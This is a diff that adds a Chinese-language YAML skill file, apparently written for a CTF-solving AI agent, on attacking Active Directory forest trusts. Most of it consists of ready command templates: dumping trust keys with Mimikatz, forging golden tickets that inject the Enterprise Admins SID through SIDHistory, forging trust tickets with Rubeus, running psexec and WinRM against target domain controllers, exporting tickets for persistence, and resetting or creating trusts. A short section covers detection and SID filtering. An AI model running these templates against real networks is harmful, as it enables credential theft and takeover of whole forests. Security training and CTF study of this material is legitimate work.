@@ -1,0 +1,541 @@
+name: forest_trust
+description: 林信任攻击 - 涵盖跨林攻击、信任关系滥用、SIDHistory注入、林间横向移动等Active Directory林安全测试技术
+version: "2.0"
+author: CTF-Agent Team
+tags: [forest, trust, cross-forest, sidhistory, ad, inter-forest]
+priority: medium
+
+# 使用场景
+scenarios:
+  - 多林环境渗透测试
+  - 林信任关系漏洞评估
+  - 跨林权限提升攻击
+  - 林间横向移动测试
+  - AD林安全审计
+
+# 核心技术
+techniques:
+  - 林信任滥用: 利用林信任关系跨林攻击
+  - SIDHistory注入: 通过SIDHistory获取跨林权限
+  - 林间横向移动: 在多林环境中横向移动
+  - 信任密钥提取: 获取信任关系密钥
+  - 林配置攻击: 攻击林配置分区
+
+# 工具列表
+tools:
+  - Mimikatz: Kerberos票据攻击
+  - Rubeus: Kerberos攻击工具
+  - BloodHound: AD关系图分析
+  - PowerView: PowerShell AD枚举
+  - LdapRelayScan: LDAP中继扫描
+  - krbrelayx: Kerberos中继攻击
+  - Impacket: Python AD攻击套件
+
+# Active Directory林架构
+forest_architecture:
+  - components:
+      Forest: 最高级别的AD容器
+      Domain Tree: 林内的域层次结构
+      Domain: 域树中的域
+      Domain Controller: 域控制器
+      Global Catalog: 全局编录服务器
+      Schema Partition: 架构分区
+      Configuration Partition: 配置分区
+
+  - trust_types:
+      Intra-forest Trust: 林内信任 (父子域)
+      Inter-forest Trust: 林间信任
+      External Trust: 外部信任 (非AD)
+      Shortcut Trust: 快捷信任
+      Realm Trust: Kerberos域信任
+
+  - trust_directions:
+      One-way Incoming: 信任方接受被信任方访问
+      One-way Outgoing: 被信任方可以访问信任方
+      Two-way: 双向信任
+
+# 林信任枚举
+forest_trust_enumeration:
+  - template: |
+      # 林信任信息收集
+
+      # 1. 获取林信息
+
+      # PowerShell
+      Get-ADForest
+      Get-ADForest -Identity current.forest.com
+
+      # PowerView
+      Get-Forest
+      Get-ForestDomain
+
+      # 2. 获取林信任关系
+
+      # PowerShell
+      Get-ADForest | Select Domains
+      Get-ADDomainTrust
+      (Get-ADForest).Domains | ForEach-Object { Get-ADDomainTrust -Identity $_ }
+
+      # PowerView
+      Get-ForestTrust
+      Get-DomainTrust
+
+      # 3. 获取信任详细信息
+
+      nltest /domain_trusts
+      nltest /domain_trusts /all_trusts /v
+
+      # 4. 查看信任属性
+
+      Get-ADObject -LDAPFilter "(objectClass=trustedDomain)" -Properties *
+
+      # 5. 获取信任密钥信息
+
+      # 在DC上执行 (需要管理员权限)
+      # Mimikatz
+      mimikatz # lsadump::lsa /patch
+      mimikatz # lsadump::trust /patch
+
+      # 6. 使用BloodHound分析
+
+      # 收集数据
+      SharpHound.exe -c All,Trusts
+
+      # 分析信任关系图
+
+      # 7. 枚举信任账户
+
+      # 信任账户格式: TARGET$ 或 <DOMAIN>$
+      Get-ADUser -LDAPFilter "(objectClass=user)" | Where-Object { $_.Name -like "*$" }
+
+      # 信任密码存储在:
+      # Inter-forest trust: 存储在双方的DC
+      # 信任账户: TDO (Trusted Domain Object)
+
+# 林信任攻击技术
+forest_trust_attacks:
+  - sidhistory_injection:
+    template: |
+      # SIDHistory跨林攻击
+
+      # 原理:
+      # SIDHistory允许用户携带其他域的SID
+      # 通过伪造票据中的SIDHistory获取跨林权限
+
+      # 1. 确认林信任关系
+
+      nltest /domain_trusts
+      Get-ADForestTrust
+
+      # 2. 检查SID过滤状态
+
+      # SIDFiltering可能阻止SIDHistory
+      # 检查TrustAttributes
+      Get-ADObject -LDAPFilter "(objectClass=trustedDomain)" -Properties TrustAttributes
+
+      # TrustAttributes值:
+      # 0 = 无限制, SIDHistory允许
+      # 4 = SID过滤已启用 (QUARANTINED)
+      # 8 = 林信任, 允许SIDHistory
+      # 32 = 只限于TGT (部分限制)
+
+      # 3. 获取目标林Enterprise Admins SID
+
+      # 目标林SID格式: S-1-5-21-TARGET-SID-519
+
+      # 方法1: 从目标林查询 (如果有访问)
+      Get-ADGroup -Server target.forest.com "Enterprise Admins" -Properties SID
+
+      # 方法2: 从信任对象获取
+      Get-ADObject -LDAPFilter "(objectClass=trustedDomain)" -Properties securityIdentifier
+
+      # 4. 创建带SIDHistory的黄金票据
+
+      mimikatz # kerberos::golden
+        /domain:source.forest.com       # 当前域
+        /sid:S-1-5-21-SOURCE-SID        # 当前域SID
+        /krbtgt:source_krbtgt_hash      # krbtgt哈希
+        /user:Administrator             # 伪造用户名
+        /sids:S-1-5-21-TARGET-SID-519   # 目标林Enterprise Admins
+        /ptt
+
+      # 5. 使用票据访问目标林
+
+      # 验证票据
+      klist
+
+      # 访问目标林DC
+      dir \\TARGET-DC.target.forest.com\C$
+
+      # 执行命令
+      psexec \\TARGET-DC.target.forest.com cmd.exe
+
+  - trust_key_abuse:
+    template: |
+      # 信任密钥利用
+
+      # 信任关系使用信任密钥验证
+      # 获取信任密钥可以伪造跨林票据
+
+      # 1. 获取信任密钥
+
+      mimikatz # lsadump::lsa /patch
+      mimikatz # lsadump::trust /patch
+
+      # 输出信任账户和密钥:
+      # [0] - TARGET$
+      #   NTLM: a1b2c3... (信任密钥)
+      #   AES128: ...
+      #   AES256: ...
+
+      # 2. 使用信任密钥创建票据
+
+      # 创建信任票据 (跨林TGT)
+      mimikatz # kerberos::golden
+        /domain:source.forest.com
+        /sid:S-1-5-21-SOURCE-SID
+        /rc4:trust_key_hash    # 信任密钥
+        /target:target.forest.com
+        /service:krbtgt
+        /user:Administrator
+        /ptt
+
+      # 或使用Rubeus
+      Rubeus.exe forge
+        /domain:source.forest.com
+        /rc4:trust_key_hash
+        /target:target.forest.com
+        /user:Administrator
+        /ptt
+
+      # 3. 请示目标林的TGS
+
+      # 使用伪造的信任票据请示目标林服务
+      Rubeus.exe asktgs
+        /service:cifs/TARGET-DC.target.forest.com
+        /domain:target.forest.com
+        /dc:TARGET-DC.target.forest.com
+        /ticket:trust_ticket.kirbi
+        /ptt
+
+      # 4. 访问目标林资源
+
+      dir \\TARGET-DC.target.forest.com\C$
+
+  - foreign_group_membership:
+    template: |
+      # 外域组成员利用
+
+      # ForeignSecurityPrincipal
+      # AD允许将外域用户添加到本地组
+
+      # 1. 查找ForeignSecurityPrincipal
+
+      Get-ADObject -LDAPFilter "(objectClass=foreignSecurityPrincipal)" -Properties *
+
+      # 2. 查找包含外域成员的组
+
+      Get-ADGroup -LDAPFilter "(objectClass=group)" -Properties member |
+        Where-Object { $_.member -match "foreignSecurityPrincipal" }
+
+      # 3. 分析外域成员
+
+      # ForeignSecurityPrincipal对象:
+      # DN: CN=S-1-5-21-TARGET-SID-XXX,CN=ForeignSecurityPrincipals,...
+      # fSPAdminGroup属性显示来源
+
+      # 4. 利用外域组成员权限
+
+      # 如果目标林用户在本地域有组成员
+      # 可以获取该用户的票据
+
+      # 例如: TARGET\Administrator 在本地 Domain Admins 组
+
+      # 获取该用户的票据
+      # 方法1: 如果能访问目标林
+      # 方法2: 利用信任票据
+
+      # 5. BloodHound分析
+
+      # 查找跨林组关系
+      # 搜索 "Foreign Admin" 等关系
+
+  - intra_forest_shortcut:
+    template: |
+      # 林内快捷信任利用
+
+      # 林内快捷信任用于优化跨域访问
+
+      # 1. 发现快捷信任
+
+      Get-ADDomainTrust | Where-Object { $_.TrustType -eq "Shortcut" }
+
+      # 2. 利用快捷信任
+
+      # 如果A域和B域有快捷信任
+      # 可以绕过父子信任链
+
+      # 直接使用信任关系
+
+      # 3. 信任链分析
+
+      # 正常路径: Domain1 -> Parent -> Domain2
+      # 快捷信任: Domain1 -> Domain2 (直接)
+
+      # 使用快捷信任可以:
+      # - 减少票据请求路径
+      # - 绕过中间域限制
+
+# 林间横向移动
+inter_forest_lateral_movement:
+  - template: |
+      # 林间横向移动技术
+
+      # 1. Kerberos跨林认证
+
+      # 使用Kerberos票据访问目标林
+
+      # 步骤:
+      # a) 获取本地TGT
+      # b) 请示目标林的跨林TGT (referral TGT)
+      # c) 请示目标林TGS
+      # d) 访问目标林服务
+
+      # Mimikatz
+      mimikatz # kerberos::ask /target:krbtgt/target.forest.com
+
+      # Rubeus
+      Rubeus.exe asktgs /service:krbtgt/target.forest.com
+
+      # 2. 使用信任票据
+
+      # 创建信任票据后请求服务票据
+      Rubeus.exe asktgs
+        /service:cifs/TARGET-DC.target.forest.com
+        /domain:target.forest.com
+        /ptt
+
+      # 3. PsExec跨林
+
+      psexec.py -k target.forest.com/Administrator@TARGET-DC
+
+      # 4. WinRM跨林
+
+      Enter-PSSession -ComputerName TARGET-DC.target.forest.com -Credential (New-Object System.Management.Automation.PSCredential "Administrator", $cred)
+
+      # 5. SMB跨林
+
+      dir \\TARGET-DC.target.forest.com\C$
+
+      # 6. 持久化票据
+
+      # 导出票据保存
+      mimikatz # kerberos::list /export
+
+      # 需要时导入
+      mimikatz # kerberos::ptt ticket.kirbi
+
+# 林配置攻击
+forest_configuration_attack:
+  - template: |
+      # 林配置分区攻击
+
+      # Configuration分区包含林级配置
+      # 存储在: CN=Configuration,DC=forest,DC=com
+
+      # 1. 查询配置分区
+
+      Get-ADObject -LDAPFilter "(objectClass=*)" -SearchBase "CN=Configuration,DC=forest,DC=com" -Properties *
+
+      # 2. 重要配置对象
+
+      # CN=Sites - 站点配置
+      # CN=Services - 服务配置
+      # CN=Partitions - 分区信息
+      # CN=ForestUpdates - 林更新信息
+
+      # 3. 站点信息利用
+
+      # 获取站点拓扑
+      Get-ADObject -LDAPFilter "(objectClass=site)" -SearchBase "CN=Sites,CN=Configuration,DC=forest,DC=com"
+
+      # 站点包含:
+      # - DC位置
+      # - 子网信息
+      # - 复制拓扑
+
+      # 4. 信任对象攻击
+
+      # 信任对象存储在配置分区
+      Get-ADObject -LDAPFilter "(objectClass=trustedDomain)" -SearchBase "CN=Configuration,DC=forest,DC=com"
+
+      # 修改信任对象属性
+      # 可以影响信任关系
+
+      # 5. 架构攻击
+
+      # Schema分区控制AD对象类型
+      Get-ADObject -LDAPFilter "(objectClass=classSchema)" -SearchBase "CN=Schema,CN=Configuration,DC=forest,DC=com"
+
+      # 修改架构可能:
+      # - 创建隐藏属性
+      # - 添加恶意类定义
+
+# 信任关系滥用
+trust_abuse_techniques:
+  - template: |
+      # 信任关系滥用技术
+
+      # 1. TGT Delegation攻击
+
+      # 如果信任允许Delegation
+      # 可以委派票据访问目标林
+
+      # 检查信任属性
+      Get-ADDomainTrust -Properties TrustAttributes
+
+      # 2. Resource-Based Constrained Delegation (RBCD)
+
+      # 设置RBCD允许目标林服务模拟用户
+
+      # 3. 信任密码重置攻击
+
+      # 如果能修改信任对象
+      # 可以重置信任密码
+
+      Set-ADObject -Identity "CN=TARGET,CN=TrustedDomain,CN=Configuration,DC=forest,DC=com" -Replace @{trustAuthIncoming=...}
+
+      # 4. 创建新信任关系
+
+      # 如果有足够权限
+      # 可以创建新的信任关系
+
+      netdom trust source.forest.com /domain:target.forest.com /add /twoway
+
+      # 5. 利用信任进行欺骗
+
+      # 创建指向攻击者控制的域的信任
+      # 诱导用户认证到攻击者域
+
+# 检测与防御
+detection_defense:
+  - template: |
+      # 林信任攻击检测
+
+      # 1. 监控异常Kerberos请求
+
+      # Event ID 4768 - TGT请求
+      # Event ID 4769 - TGS请求
+      # 监控跨林票据请求
+
+      Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768,4769} |
+        Where-Object { $_.Message -match "target.forest.com" }
+
+      # 2. 监控信任对象修改
+
+      # Event ID 4716 - 信任信息修改
+      Get-WinEvent -FilterHashtable @{LogName='Security';Id=4716}
+
+      # 3. 检查SIDHistory
+
+      Get-ADUser -LDAPFilter "(sIDHistory=*)" -Properties sIDHistory
+
+      # 4. 检查ForeignSecurityPrincipal
+
+      Get-ADObject -LDAPFilter "(objectClass=foreignSecurityPrincipal)"
+
+      # 5. 监控跨林访问
+
+      # 检查来自其他林的认证
+
+      # 防御措施:
+
+      # 1. 启用SID过滤
+
+      # 对于非林信任,启用SID过滤
+      netdom trust source.forest.com /domain:target.forest.com /quarantine:yes
+
+      # 2. 限制信任范围
+
+      # 只创建必要的信任
+      # 定期审查信任关系
+
+      # 3. 监控信任账户
+
+      # 信任账户密码定期重置
+      # 监控信任账户活动
+
+      # 4. 启用选择性认证
+
+      # 限制信任可访问的资源
+
+      # 5. 林隔离
+
+      # 对敏感资源实施额外保护
+
+# CTF场景示例
+ctf_scenarios:
+  - template: |
+      # 林信任CTF场景
+
+      # 场景1: 双向林信任
+
+      # ForestA信任ForestB
+      # 获取ForestA krbtgt后攻击ForestB
+
+      # 1. 确认信任关系
+      nltest /domain_trusts
+
+      # 2. 获取ForestB Enterprise Admins SID
+      Get-ADGroup -Server forestB.com "Enterprise Admins" -Properties SID
+
+      # 3. 创建带SIDHistory的黄金票据
+      mimikatz # kerberos::golden
+        /domain:forestA.com
+        /sid:S-1-5-21-A-SID
+        /krbtgt:krbtgt_hash
+        /user:Administrator
+        /sids:S-1-5-21-B-SID-519
+        /ptt
+
+      # 4. 访问ForestB域控获取Flag
+      dir \\DC-B.forestB.com\C$\Flag\
+
+      # 场景2: 信任密钥利用
+
+      # 1. 获取信任密钥
+      mimikatz # lsadump::trust /patch
+
+      # 2. 创建跨林票据
+      mimikatz # kerberos::golden
+        /domain:forestA.com
+        /sid:S-1-5-21-A-SID
+        /rc4:trust_key
+        /target:forestB.com
+        /service:krbtgt
+        /user:Administrator
+        /ptt
+
+      # 3. 请求ForestB服务票据
+      Rubeus.exe asktgs /service:cifs/DC-B.forestB.com
+
+      # 4. 访问获取Flag
+
+      # 场景3: ForeignSecurityPrincipal利用
+
+      # 1. 发现ForeignSecurityPrincipal
+      Get-ADObject -LDAPFilter "(objectClass=foreignSecurityPrincipal)"
+
+      # 2. 发现外域管理员在本地域的权限
+      BloodHound分析
+
+      # 3. 利用外域账户访问
+
+# 参考资源
+references:
+  - https://adsecurity.org/?p=1588
+  - https://github.com/BloodHoundAD/BloodHound
+  - https://attack.mitre.org/techniques/T1199/
+  - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc772560(v=ws.10)
+  - https://github.com/gentilkiwi/mimikatz
+  - https://github.com/GhostPack/Rubeus
